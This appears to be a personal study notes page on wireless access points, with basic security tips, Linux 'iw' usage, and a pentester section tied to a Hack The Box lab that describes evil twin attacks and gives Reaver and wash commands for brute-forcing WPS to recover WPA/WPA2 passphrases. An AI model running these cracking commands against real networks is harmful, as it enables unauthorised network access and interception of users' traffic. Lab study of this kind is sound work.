# Wireless Access points

<div class="row row-cols-lg-2"><div>

A wireless access point (AP) is a device providing wireless connectivity to a wired network 📶. [Wi-Fi](/operating-systems/networking/others/technologies/wi-fi.md) is the most well-known protocol.

Most of the time, we refer to a WAP when we say "access point" (AP).

Access point security 🔒

* Limit the range to the company
* Disable SSID broadcasting <small>(if applicable)</small>
* Use non-default settings
</div><div>

On Linux, wireless network interfaces are starting with `wlan`. You can use `iwconfig` to dig information about them while `iw` is the modern recommended alternative.

```ps
$ iw dev             # same as 'iwconfig'
Interface wlan0
    ...
    addr 02:00:00:00:00:00
```

We commonly use `hostapd` for managing an access point.
</div></div>

<hr class="sep-both">

## Pentester Access point Notes ☠️

[![wifinetic](../../../../cybersecurity/_badges/htb-p/wifinetic.svg)](https://app.hackthebox.com/machines/Wifinetic)

<div class="row row-cols-lg-2"><div class="mt-lg-2">

* 💥 Evil twin attack

A hacker create an access point using the SSID of another network. Users may connect to it, and the hacker will be able to do an M-I-T-M attack or sniff communications.

* Dig Information

If you have access to a device connected to a wireless network or acting as an access point:

```shell!
$ iw dev
Interface wlan0
    type AP                 -- access point
    addr 02:00:00:00:00:00  -- bssid
    type managed            -- client
    type monitor            -- used to monitor trafic
```
</div><div>

* If you have access to a monitor interface and you have the BSSID associated with the access point, you can try to use [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) to brute force the WPA/WPA2 passphrase.

```shell!
$ reaver -i mon0 -b 02:00:00:00:02:00 -v
$ reaver -i mon0 -b 02:00:00:00:02:00 -vv
$ reaver -i mon0 -b 02:00:00:00:02:00 -vv -c 1
```

* If you have enough permissions, you can scan for wireless networks using the [wash](https://github.com/t6x/reaver-wps-fork-t6x) command:

```shell!
$ wash -i mon0
$ wash -i mon0 -c 6
$ wash -i mon0 -c 6 -C 
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* MAC filtering
* `wpa_supplicant`
</div><div>
</div></div>